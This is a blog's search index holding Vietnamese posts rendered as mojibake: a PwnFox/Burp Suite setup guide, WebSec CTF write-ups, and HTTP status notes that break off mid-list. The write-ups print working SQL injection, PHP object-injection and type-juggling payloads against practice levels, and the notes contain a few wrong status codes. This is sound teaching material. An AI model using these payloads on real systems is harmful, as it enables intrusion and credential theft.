<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>PwnFox Extension on Firefox for Pentester</title>
    <link href="/2022/07/20/PwnFox/"/>
    <url>/2022/07/20/PwnFox/</url>
    
    <content type="html"><![CDATA[<p>Trong bÃ i viáº¿t nÃ y, mÃ¬nh sáº½ giá»›i thiá»‡u má»i ngÆ°á»i má»™t extension chuyÃªn dÃ¹ng cho viá»‡c cÃ i Ä‘áº·t proxy cho Burp Suite, ngoÃ i ra nÃ³ cÃ²n cÃ³ nhiá»u tÃ­nh nÄƒng hay ho ná»¯a ğŸ˜.</p><blockquote><p>Link extension: <a href="https://github.com/yeswehack/PwnFox">https://github.com/yeswehack/PwnFox</a></p></blockquote><h3 id="Install"><a href="#Install" class="headerlink" title="Install"></a><strong>Install</strong></h3><p>CÃ¡c báº¡n vÃ o link github á»Ÿ trÃªn, download file pwnfox.jar vá» mÃ¡y vÃ  lÆ°u nÃ³ á»Ÿ thÆ° má»¥c nÃ o mÃ  báº¡n muá»‘n.</p><p><img src="/img/Technical/PwnFox/image1.png"></p><p>Sau khi táº£i extension xong, má»Ÿ á»©ng dá»¥ng Burp Suite lÃªn, vÃ o tab <strong>Extension</strong>.</p><p><img src="/img/Technical/PwnFox/image2.png"></p><p>Chá»n Add, cá»­a sá»• Load Burp Extension hiá»‡n lÃªn, chá»n Ä‘áº¿n file pwnfox.jar vá»«a táº£i lÃºc nÃ£y, sau Ä‘Ã³ báº¥m Next lÃ  xong.</p><h3 id="Set-up"><a href="#Set-up" class="headerlink" title="Set up"></a><strong>Set up</strong></h3><p>Má»Ÿ trÃ¬nh duyá»‡t FireFox, tÃ¬m kiáº¿m <a href="https://addons.mozilla.org/vi/firefox/addon/pwnfox/"><span style="color:#FF4500">pwnfox entension</span></a>.</p><p><img src="/img/Technical/PwnFox/image3.png"></p><p>Sau khi cÃ i extension cho Firefox, setting cá»§a Pwnfox kiá»ƒm tra IP vÃ  PORT Ä‘Ã£ Ä‘Ãºng chÆ°a.</p><p><img src="/img/Technical/PwnFox/image4.png"></p><p>BÆ°á»›c cuá»‘i cÃ¹ng lÃ  vÃ o pháº§n Setting Network cá»§a Firefox Ä‘á»ƒ lá»±a chá»n <strong>No proxy</strong>.</p><p><img src="/img/Technical/PwnFox/image5.png"></p><h3 id="Tinh-nang-container-tab"><a href="#Tinh-nang-container-tab" class="headerlink" title="TÃ­nh nÄƒng container tab"></a><strong>TÃ­nh nÄƒng container tab</strong></h3><p>NÃ³ sáº½ lÃ  nhá»¯ng tab cÃ³ mÃ u sáº¯c trÃªn firefox.</p><p><img src="/img/Technical/PwnFox/image6.png"></p><p>Má»—i tab sáº½ hoáº¡t Ä‘á»™ng Ä‘á»™c láº­p vá»›i cÃ¡c session khÃ¡c nhau.</p><p>Khi Ä‘i qua proxy Burp Suite, vÃ o history sáº½ tháº¥y Ä‘Æ°á»£c mÃ u cá»§a cÃ¡c tab tÆ°Æ¡ng á»©ng.</p><p><img src="/img/Technical/PwnFox/image7.png"></p>]]></content>
    
    
    <categories>
      
      <category>Technical</category>
      
    </categories>
    
    
    <tags>
      
      <tag>extension</tag>
      
      <tag>pwnfox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[WebSec] Level 4</title>
    <link href="/2022/07/19/Level4/"/>
    <url>/2022/07/19/Level4/</url>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://websec.fr/level04/index.php">https://websec.fr/level04/index.php</a></p></blockquote><h3 id="Gathering-information"><a href="#Gathering-information" class="headerlink" title="Gathering information"></a><strong>Gathering information</strong></h3><p>Challenge nÃ y cÃ³ chá»— input lÃ  id, nhÆ°ng khÃ´ng giá»‘ng nhÆ° Level 1 lÃ  sáº½ ra lá»—i khi nháº­p kÃ½ tá»± Ä‘áº·c biá»‡t.</p><p>Vá»›i giÃ¡ trá»‹ cookie leet_hax0r: Decode base64 ra thÃ¬ lÃ  má»™t dáº¡ng json sau khi <a href="https://snoopysecurity.github.io/web-application-security/2021/01/08/02_php_object_injection_exploitation-notes.html">serialize</a>.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">a<span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ip&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">13</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;116.96.78.101&quot;</span>;<span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>Ã nghÄ©a cá»§a cÃ¡c thÃ nh pháº§n Ä‘oáº¡n JSON trÃªn lÃ :</p><blockquote><p>a: array sáº½ chá»©a 1 giÃ¡ trá»‹ duy nháº¥t lÃ  <code>ip</code>.<br><code>ip</code> cÃ³ Ä‘á»™ dÃ i lÃ  2, vÃ  cÃ³ <code>value</code> dÃ i 13 kÃ­ tá»±.</p></blockquote><p>Cáº¥u trÃºc cá»§a Serialize trong PHP cÃ³ dáº¡ng <code>data-type:data</code>.</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs txt">BOOLEAN<br>b:value (value chá»‰ cÃ³ giÃ¡ trá»‹ 1 hoáº·c 0. 1 lÃ  Ä‘Ãºng, 0 lÃ  sai).<br><br>STRING<br>s:size:value (s:5:&quot;12345&quot;)<br><br>INTEGER<br>i:value<br><br>NULL<br>N;<br><br>ARRAY<br>a:size:&#123;key:value; (láº·p láº¡i key:value Ä‘áº¿n khi báº±ng size))&#125;<br><br>OBJECT<br>O:length_object_name:object_name:object_size:&#123;&lt;property&gt;:&lt;value&gt;&#125;<br></code></pre></td></tr></table></figure><hr><p>Challenge cho 2 source code, nhÆ°ng chÃº Ã½ trong source 1 lÃ  viáº¿t á»Ÿ dáº¡ng OOP, cÃ³ cÃ¡c <a href="https://www.php.net/manual/en/language.oop5.magic.php">Magic Methods</a> Ä‘Æ°á»£c dÃ¹ng nhÆ° <code>__construct()</code>, <code>__destruct()</code>.</p><ul><li><p><code>__construct()</code>: hÃ m nÃ y Ä‘Æ°á»£c gá»i khi khá»Ÿi táº¡o má»™t Ä‘á»‘i tÆ°á»£ng.</p></li><li><p><code>__destruct()</code>: hÃ m nÃ y Ä‘Æ°á»£c gá»i khi Ä‘á»‘i tÆ°á»£ng bá»‹ xoÃ¡ Ä‘i. Khi nÃ³ khÃ´ng tham chiáº¿u Ä‘áº¿n Ä‘á»‘i tÆ°á»£ng deserialize tá»“n táº¡i.</p></li></ul><p><img src="/img/CTF/WebSec/lv4/image1.png" alt="Source code 1"></p><p><img src="/img/CTF/WebSec/lv4/image2.png" alt="Source code 2"></p><p>QuÃ¡ trÃ¬nh serialize vÃ  deserialize diá»…n ra nhÆ° hÃ¬nh bÃªn dÆ°á»›i:</p><p><img src="/img/CTF/WebSec/lv4/ser_deser.png" alt="Serialize &amp; Deserialize"></p><hr><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a><strong>Exploit</strong></h3><p>Äá»ƒ Ã½ dÃ²ng code á»Ÿ source 2. ThÃ¬ giÃ¡ trá»‹ cookie leet_hax0r Ä‘Æ°á»£c <code>encode base64</code>.</p><p>MÃ¬nh sáº½ táº¡o dÃ²ng Code giá»‘ng class SQL Ä‘á»ƒ serialize nÃ³.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SQL</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$query</span>=<span class="hljs-string">&#x27;select username from users where id = -1 union select sql from sqlite_master&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">SQL</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>), PHP_EOL;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p>Sau khi bulid source xong, run code sáº½ ra Object vÃ  Ä‘oáº¡n base64 nhÆ° sau:</p><p><img src="/img/CTF/WebSec/lv4/image3.png" alt="Serialize SQL Object"></p><p><em>VÃ¬ sao pháº£i dÃ¹ng UNION Ä‘á»ƒ select sql mÃ  khÃ´ng select á»Ÿ váº¿ trÆ°á»›c luÃ´n?</em></p><blockquote><p>VÃ¬ ta Ä‘á»ƒ Ã½ source code 2, trong hÃ m <code>__destruct()</code> chá»‰ in ra mÃ n hÃ¬nh <code>$row[&#39;username&#39;]</code>. NÃªn báº¯t buá»™c trong cÃ¢u query cá»§a mÃ¬nh pháº£i select username.</p></blockquote><p>Hoáº·c cÃ³ thá»ƒ dÃ¹ng cÃ¢u query gÃ¡n tÃªn cá»™t cáº§n select báº±ng username nhÆ° sau cho gá»n:</p><pre><code class="sql">select group_concat(sql) as username from ...</code></pre><p>Copy Ä‘oáº¡n base64 thay tháº¿ giÃ¡ trá»‹ cookie leet_hax0r, sau Ä‘Ã³ gá»­i reuqest:</p><p><img src="/img/CTF/WebSec/lv4/image4.png" alt="Cáº¥u trÃºc cÃ¢u query Ä‘Æ°á»£c dÃ¹ng"></p><p>Kiá»ƒm tra xem cÃ²n table nÃ o ngoÃ i users khÃ´ng? Káº¿t quáº£ lÃ  khÃ´ng cÃ²n table nÃ o khÃ¡c.</p><p><img src="/img/CTF/WebSec/lv4/image5.png" alt="Check another table"></p><p>MÃ¬nh Ä‘oÃ¡n lÃ  Flag náº±m á»Ÿ password, nÃªn sáº½ select password ra.</p><p><img src="/img/CTF/WebSec/lv4/image6.png" alt="Payload get flag"></p><p><img src="/img/CTF/WebSec/lv4/image7.png" alt="Got the flag"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Websec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>babysteps</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[WebSec] Level 17</title>
    <link href="/2022/07/19/Level17/"/>
    <url>/2022/07/19/Level17/</url>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://websec.fr/level17/index.php">https://websec.fr/level17/index.php</a></p></blockquote><hr><h3 id="Gathering-information"><a href="#Gathering-information" class="headerlink" title="Gathering information"></a><strong>Gathering information</strong></h3><p>NhÆ° thÆ°á»ng lá»‡, bÆ°á»›c Ä‘áº§u tiÃªn chÃºng ta ngÃ³ xem qua pháº§n giao diá»‡n, cÃ³ chá»— input vÃ  button Submit.</p><p>NÃ³ yÃªu cáº§u mÃ¬nh Ä‘oÃ¡n flag, nÃªn thá»­ nháº­p Ä‘áº¡i gÃ¬ Ä‘Ã³, vÃ  xem response tráº£ vá» tháº¿ nÃ o. KhÃ´ng cÃ³ gÃ¬ Ä‘Ã¡ng chÃº Ã½ hÆ¡n link tá»›i source code.</p><p>Challenge cho sáºµn luÃ´n source code, chÃºng qua vÃ  Ä‘á»ƒ Ã½ Ä‘áº¿n 2 pháº§n code PHP.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sleep_rand</span>(<span class="hljs-params"></span>) </span>&#123; <span class="hljs-comment">/* I wish php5 had random_int() */</span><br>        <span class="hljs-variable">$range</span> = <span class="hljs-number">100000</span>;<br>        <span class="hljs-variable">$bytes</span> = (<span class="hljs-keyword">int</span>) (<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-variable">$range</span>, <span class="hljs-number">2</span>) / <span class="hljs-number">8</span>) + <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">do</span> &#123;  <span class="hljs-comment">/* Side effect: more random cpu cycles wasted ;) */</span><br>            <span class="hljs-variable">$rnd</span> = <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="hljs-variable">$bytes</span>)));<br>        &#125; <span class="hljs-keyword">while</span> (<span class="hljs-variable">$rnd</span> &gt;= <span class="hljs-variable">$range</span>);<br>        <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-variable">$rnd</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>Äoáº¡n code trÃªn chá»‰ lÃ  hÃ m Ä‘á»ƒ delay trong quÃ¡ trÃ¬nh thá»±c thi chÆ°Æ¡ng trÃ¬nh. Khi nÃ o gá»i láº¡i hÃ m <code>sleep_rand()</code> thÃ¬ Ä‘oáº¡n xá»­ lÃ­ Ä‘Ã³ sáº½ delay.</p><p>Thá»i gian delay lÃ¢u hay mau phá»¥ thuá»™c vÃ o hÃ m random á»Ÿ dÃ²ng 8. HÃ m <code>openssl_random_pseudo_bytes()</code> sáº½ táº¡o ra random string pseudo_bytes tá»« param $bytes á»Ÿ dáº¡ng binary.</p><p>Sau Ä‘Ã³ hÃ m <code>bin2hex()</code> sáº½ convert binary sang dáº¡ng hex. Tiáº¿p theo hÃ m <code>hexdec()</code> sáº½ convert hex sang dáº¡ng decemal.</p><p>Äáº¡i khÃ¡i lÃ  hÃ m trÃªn cÅ©ng khÃ´ng áº£nh hÆ°Æ¡ng tá»›i challenge nhiá»u, vÃ¬ hÃ m <code>usleep()</code> sáº½ delay chÆ°Æ¡ng trÃ¬nh vá»›i param lÃ  <strong>micro second</strong>. VÃ­ dá»¥ <code>usleep(2000000)</code> thÃ¬ sáº½ delay 2s.</p><hr><p>Tiáº¿p Ä‘áº¿n source code cÃ²n láº¡i:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-title function_ invoke__">strcasecmp</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>], <span class="hljs-variable">$flag</span>))<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;alert alert-success&quot;&gt;Here is your flag: &lt;mark&gt;&#x27;</span> . <span class="hljs-variable">$flag</span> . <span class="hljs-string">&#x27;&lt;/mark&gt;.&lt;/div&gt;&#x27;</span>;   <br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;alert alert-danger&quot;&gt;Invalid flag, sorry.&lt;/div&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>Quan sÃ¡t tháº¥y thÃ¬ Ä‘oáº¡n code phÃ­a trÃªn sáº½ so sÃ¡nh giÃ¡ trá»‹ cá»§a <code>flag</code> khi input tá»« user vÃ o vÃ  giÃ¡ trá»‹ <code>$flag</code> Ä‘Ã£ assign trong chÆ°Æ¡ng trÃ¬nh. </p><p>NhÆ°ng Ä‘á»ƒ so sÃ¡nh thÃ¬ dÃ¹ng hÃ m <code>strcasecmp()</code>, Ä‘iá»u Ä‘Ã¡ng nÃ³i hÆ¡n á»Ÿ Ä‘Ã¢y lÃ  dáº¥u cháº¥m thang á»Ÿ phÃ­a trÆ°á»›c hÃ m.</p><blockquote><p>HÃ m <code>strcasecmp($str1, $str2)</code> sáº½ nháº­n vÃ o 2 string Ä‘á»ƒ so sÃ¡nh. Káº¿t quáº£ tráº£ vá» lÃ :</p><ul><li>&gt; 0: Náº¿u nhÆ° $str1 &gt; $str2.</li><li>&lt; 0: Náº¿u nhÆ° $str1 &lt; $str2.</li><li>&#x3D; 0: Náº¿u nhÆ° $str1 &#x3D; $str2.</li></ul></blockquote><p>Dáº¥u cháº¥m thang á»Ÿ phÃ­a trÆ°á»›c cÃ³ nghÄ©a lÃ  <code>$str1</code> vÃ  <code>$str2</code> báº±ng nhau.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (! <span class="hljs-title function_ invoke__">strcasecmp</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>], <span class="hljs-variable">$flag</span>))<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strcasecpm</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>], <span class="hljs-variable">$flag</span>) == <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>Hai dÃ²ng code trÃªn lÃ  tÆ°Æ¡ng tá»± nhau vá» máº·t chá»©c nÄƒng vÃ  báº£n cháº¥t.</p><p>Khi so sÃ¡nh <code>==</code> thÃ¬ láº¡i Ä‘á»ƒ Ã½ tá»›i lá»—i <a href="https://www.invicti.com/blog/web-security/php-type-juggling-vulnerabilities/">Type Jugling</a> vÃ  tham kháº£o hai hÃ¬nh bÃªn dÆ°á»›i.</p><p><img src="/img/CTF/WebSec/lv17/loose-comparison.png" alt="Loose"></p><p><img src="/img/CTF/WebSec/lv17/strict-comparison.png" alt="Strict"><br>&#96;</p><hr><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a><strong>Exploit</strong></h3><p>Khi mÃ  so sÃ¡nh trong hÃ m <code>strcasecpm()</code> sáº½ cho ra kÃªt quáº£ lÃ  <code>False</code>. Tiáº¿p theo <code>False</code> so vá»›i <code>0</code> thÃ¬ sáº½ lÃ  <code>True</code>.</p><p><img src="/img/CTF/WebSec/lv17/debug1.png" alt="Debug compare"></p><p>Tá»« Ä‘Ã³, sáº½ in ra Ä‘Æ°á»£c flag.</p><blockquote><p>Payload: <strong>flag[]&#x3D;1</strong></p></blockquote><p>Káº¿t quáº£:</p><p><img src="/img/CTF/WebSec/lv17/kq.png" alt="KetQua"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Websec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>babysteps</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[WebSec] Level 1</title>
    <link href="/2022/07/19/Level1/"/>
    <url>/2022/07/19/Level1/</url>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://websec.fr/level01/index.php">https://websec.fr/level01/index.php</a></p></blockquote><h3 id="Gathering-information"><a href="#Gathering-information" class="headerlink" title="Gathering information"></a><strong>Gathering information</strong></h3><p>Sau khi nhÃ¬n sÆ¡ qua bá»‘i cáº£nh challenge, thÃ¬ cÃ³ 1 chá»— input lÃ  sá»‘ Ä‘á»ƒ xem thÃ´ng tin ID.<br>VÃ  challenge cÅ©ng Ä‘Ã£ cho source sáºµn:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LevelOne</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doQuery</span>(<span class="hljs-params"><span class="hljs-variable">$injection</span></span>) </span>&#123;<br>        <span class="hljs-variable">$pdo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SQLite3</span>(<span class="hljs-string">&#x27;database.db&#x27;</span>, SQLITE3_OPEN_READONLY);<br>        <br>        <span class="hljs-variable">$query</span> = <span class="hljs-string">&#x27;SELECT id,username FROM users WHERE id=&#x27;</span> . <span class="hljs-variable">$injection</span> . <span class="hljs-string">&#x27; LIMIT 1&#x27;</span>;<br>        <span class="hljs-variable">$getUsers</span> = <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$query</span>);<br>        <span class="hljs-variable">$users</span> = <span class="hljs-variable">$getUsers</span>-&gt;<span class="hljs-title function_ invoke__">fetchArray</span>(SQLITE3_ASSOC);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$users</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$users</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Vá»›i Ä‘oáº¡n code trÃªn, táº¡i dÃ²ng 5. Náº¿u nhÆ° mÃ¬nh truyá»n vÃ o lÃ  dáº¥u â€˜, chá»¯ cÃ¡i, kÃ­ tá»± Ä‘áº·c biá»‡t thÃ¬ sáº½ bÃ¡o lá»—i.</p><p><img src="/img/CTF/WebSec/lv1/image1.png" alt="Lá»—i khi nháº­p chá»¯ a"></p><p>Vá»›i source code vÃ  thÃ´ng bÃ¡o lá»—i, mÃ¬nh xÃ¡c Ä‘á»‹nh Ä‘Æ°á»£c Ä‘Ã¢y lÃ  lá»—i SQL injection trÃªn SQLite3.</p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a><strong>Exploit</strong></h3><p>VÃ¬ ID kiá»ƒu dá»¯ liá»‡u thÆ°á»ng lÃ  sá»‘, nÃªn mÃ¬nh sáº½ dÃ¹ng ká»¹ thuáº­t khai thÃ¡c lÃ  <a href="https://sechow.com/bricks/docs/content-page-1.html">UNION</a>.</p><ul><li>Kiá»ƒm tra sá»‘ cá»™t Ä‘Æ°á»£c select.</li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">1 order by 2 ==&gt; OK<br>1 order by 3 ==&gt; ERROR<br></code></pre></td></tr></table></figure><p>Váº­y lÃ  cÃ³ 2 cá»™t Ä‘Æ°á»£c select.</p><p>Tiáº¿p theo cáº§n xem cÃ¡c cá»™t Ä‘Ã³ lÃ  gÃ¬.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">sql</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> sqlite_master<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span> <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> users(id <span class="hljs-type">int</span>(<span class="hljs-number">7</span>), username <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>), password <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>))<br></code></pre></td></tr></table></figure><p><img src="/img/CTF/WebSec/lv1/image2.png" alt="Query Ä‘Æ°á»£c dÃ¹ng"></p><p>XÃ¡c Ä‘á»‹nh Ä‘Æ°á»£c table lÃ  <code>users</code> vÃ  cÃ¡c cá»™t lÃ  <code>id, username, password</code>.</p><p>TÃ¬m xem cÃ²n table nÃ o ngoÃ i users hay khÃ´ng?</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(tbl_name),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> sqlite_master <span class="hljs-keyword">where</span> type<span class="hljs-operator">=</span><span class="hljs-string">&#x27;table&#x27;</span> <span class="hljs-keyword">and</span> tbl_name <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;sqlite_%&#x27;</span><br></code></pre></td></tr></table></figure><p>Cuá»‘i cÃ¹ng get flag thÃ´i.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> password <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span>&quot;flag&quot;<br></code></pre></td></tr></table></figure><p><img src="/img/CTF/WebSec/lv1/image3.png" alt="Flag"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Websec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>babysteps</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTPâ„HTTPS</title>
    <link href="/2022/07/19/HTTP%E2%81%84HTTPS/"/>
    <url>/2022/07/19/HTTP%E2%81%84HTTPS/</url>
    
    <content type="html"><![CDATA[<h1 id="HTTP-x2F-HTTPS"><a href="#HTTP-x2F-HTTPS" class="headerlink" title="HTTP&#x2F;HTTPS"></a>HTTP&#x2F;HTTPS</h1><p>Created: June 20, 2021 8:30 AM<br>Status: Complete</p><p><img src="/img/Security/Web/url.png"></p><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>Hypertext Transfer Protocol (giao thá»©c truyá»n táº£i siÃªu vÄƒn báº£n).</p><p>DÃ¹ng port: 80</p><p>Giao thá»©c cÆ¡ báº£n dÃ¹ng cho World Wide Web (www) Ä‘á»ƒ truyá»n dá»¯ liá»‡u dÆ°á»›i dáº¡ng vÄƒn báº£n, hÃ¬nh áº£nh, Ã¢m thanh tá»« webserver Ä‘áº¿n cÃ¡c trÃ¬nh duyá»‡t vÃ  ngÆ°á»£c láº¡i.</p><h2 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h2><p>Hypertext Transfer Protocol Secure.</p><p>DÃ¹ng port: 443&#x2F;4433</p><p>Dá»¯ liá»‡u chuyá»ƒn tá»« Webserver Ä‘áº¿n trÃ¬nh duyá»‡t khÃ´ng Ä‘Æ°á»£c mÃ£ hÃ³a, dá»… bá»‹ Ä‘Ã¡nh cáº¯p. Giao thá»©c https dÃ¹ng SSL (secure sockets layer - lá»›p cá»•ng báº£o máº­t) Ä‘á»ƒ mÃ£ hÃ³a dá»¯ liá»‡u giá»¯a website vÃ  web browser. Hiá»‡n táº¡i SSL khÃ´ng cÃ²n Ä‘Æ°á»£c sá»­ dá»¥ng ná»¯a, chuyá»ƒn sang TSL (Transport Security Layer), giá»‘ng nhÆ° SSL. </p><p><img src="/img/Security/Web/http.png"></p><h2 id="HTTP-Status-Code"><a href="#HTTP-Status-Code" class="headerlink" title="HTTP Status Code"></a>HTTP Status Code</h2><ul><li>100-199: Information <em>(100: Continue; 101: Switching protocols)</em>.</li><li>200-299: Successes <em>(200 OK is the â€œnormalâ€ response for a GET; 201: Created; 201: Accepted; 203: Non-authoritative information; 204: No content; 205: Reset content; 206: Partial content)</em></li><li>300-399: Redirects <em>(the information you want is elsewhereâ€™ 301: Moved permanently; 302: Moved temporarily; 304: Not modified)</em></li><li>400-499: Client errors <em>(You did something wrong, like asking for something that doesnâ€™t exist; 403: forbidden; 404: not found; 405: Method not allowed; â€¦)</em></li><li>500-599: Server errors <em>(The server tried, but something went wrong on their side; 500: internal server error; 501: Not implemented; 502: Bad gateway; 505: Gateway timeout)</em></li></ul><p><strong>Vi du</strong></p><ul><li>201 Created â€“ Tráº£ vá» khi má»™t Resouce vá»«a Ä‘Æ°á»£c táº¡o thÃ nh cÃ´ng.</li><li>204 No Content â€“ Tráº£ vá» khi Resource xoÃ¡ thÃ nh cÃ´ng.</li><li>304 Not Modified â€“ Client cÃ³ thá»ƒ sá»­ dá»¥ng dá»¯ liá»‡u cache.</li><li>400 Bad Request â€“ Request khÃ´ng há»£p lá»‡</li><li>401 Unauthorized â€“ Request cáº§n cÃ³ auth.</li><li>403 Forbidden â€“ bá»‹ tá»« chá»‘i khÃ´ng cho phÃ©p.</li><li>404 Not Found â€“ KhÃ´ng tÃ¬m tháº¥y resource tá»« URI</li><li>405 Method Not Allowed â€“ PhÆ°Æ¡ng 